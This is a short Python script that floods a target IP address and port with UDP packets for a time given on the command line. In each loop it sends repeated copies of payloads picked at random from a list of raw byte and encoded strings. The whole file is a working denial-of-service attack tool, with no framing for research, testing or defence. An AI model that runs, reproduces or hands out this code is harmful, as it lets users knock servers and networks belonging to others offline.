import threading
import time
import random
import socket
import sys
def attack_std(ip, port, secs):
    payload_ = [b'\x73\x74\x64\x00\x00\x00\x00\x00\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00', b'\x35\x00\xA7\x80\x00', b'bIBwdBwoJSgkDGwcQDVU=', b'LBIAA0cKE0siChEAClRURT8dBhkMX19f', b'BgEBAxMSSh8DTyglLQNBRU9L', b'CQcQFhRSRUQLBh0dDBZcBhwVTDgHFhgWEw8D', b'CRIMB0cKCwUIGAABEVQVClMaEQQQHB8eGwcLBhQTARYUFRoY', b'\xFF\xFF\xFF\xFF\x00', b'BNI8UBv67fgyafV6V7VVv8bv7tvV8V7V']
    while time.time() < secs:
        payload=random.choice(payload_)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
args=sys.argv
ip = args[1]
port=int(args[2])
secs = time.time() + int(args[3])
threads = 1

for _ in range(threads):
    threading.Thread(target=attack_std, args=(ip, port, secs)).start()
